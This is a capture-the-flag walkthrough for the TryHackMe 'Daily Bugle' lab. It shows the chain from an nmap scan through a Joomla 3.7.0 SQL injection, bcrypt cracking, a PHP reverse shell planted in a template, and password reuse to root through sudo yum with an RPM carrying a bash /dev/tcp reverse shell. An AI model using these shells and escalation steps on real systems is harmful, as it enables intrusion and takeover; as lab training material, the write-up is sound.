# [Daily Bugle](https://tryhackme.com/room/dailybugle)

Machine IP: `10.10.55.2`

Nmap results:

`nmap --top-ports 100 -sV $MACHINE`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-13 00:27 CET
Nmap scan report for 10.10.55.2
Host is up (0.088s latency).
Not shown: 97 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.05 seconds
```

Dirbuster results:
`gobuster -u http://10.10.55.2/ -w ~/wordlists/Discovery/Web-Content/directory-list-2.3-small.txt`
```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.55.2/
[+] Threads      : 10
[+] Wordlist     : /home/damian/wordlists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2021/11/13 00:43:25 Starting gobuster
=====================================================
/images (Status: 301)
/templates (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
/cli (Status: 301)
```


On `/administrator` endpoint we can find that this server is running on Joomla.
To check Joomla version we can visit `http://10.10.55.2/administrator/manifests/files/joomla.xml`.

Result: `<version>3.7.0</version>`

[Quick Google search shows that this version is affected](https://www.exploit-db.com/exploits/42033)

We can use [this script](https://github.com/stefanlucas/Exploit-Joomla) to exploit this vuln. We need to use `python2` and install module `requests` in order for it to work.

The output is:

```
[-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

This hash format is [bcrypt](https://en.wikipedia.org/wiki/Bcrypt).

We can crack this using `john hash.txt --wordlist=~/wordlists/rockyou.txt --format=bcrypt`

Output:
```
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:02:07 100% 0.007827g/s 366.7p/s 366.7c/s 366.7C/s wingwing..smile4ever
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

So, the password is `spiderman123`

Now that we have access to admin panel of Joomla, we can gain reverse shell by entering `Extensions->Templates->Protostar` and edit `index.php` to include following reverse shell in it: `$sock=fsockopen("10.8.248.211",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);`

We are user `apache`. We can download `linpeas` using local http server (`python3 -m http.server 8080`). A quick look at the results shows this suspicious snippet (in `configuration.php`):

```
╔══════════╣ Searching passwords in config PHP files
	public $password = 'nv5uz9r3ZEDzVjNu';
			$this->password = (empty($this->options['db_pass'])) ? '' : $this->options['db_pass'];
			$this->password = null;
			'password' => $this->password,
```

If we try this password for `jjameson` user it works! We can also connect via ssh using that password and `ssh jjameson@10.10.55.2`.

We can now cat the `user` flag.

`sudo -l` has interesting output:

```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

This gives us a hint that we may be able to exploit `yum`.

[GTFObins](https://gtfobins.github.io/gtfobins/yum/) confirms that suspicion and shows how we are able to exploit `yum`. [This](https://medium.com/@klockw3rk/privilege-escalation-how-to-build-rpm-payloads-in-kali-linux-3a61ef61e8b2) site is also useful.

In short: we need to create an `rpm` package which can be based on a `bash` script with reverse shell, in my case:
```
#!/bin/bash

bash -i >& /dev/tcp/10.8.248.211/8082 0>&1
```

After that, it's as simple as reading flag in `/root`.
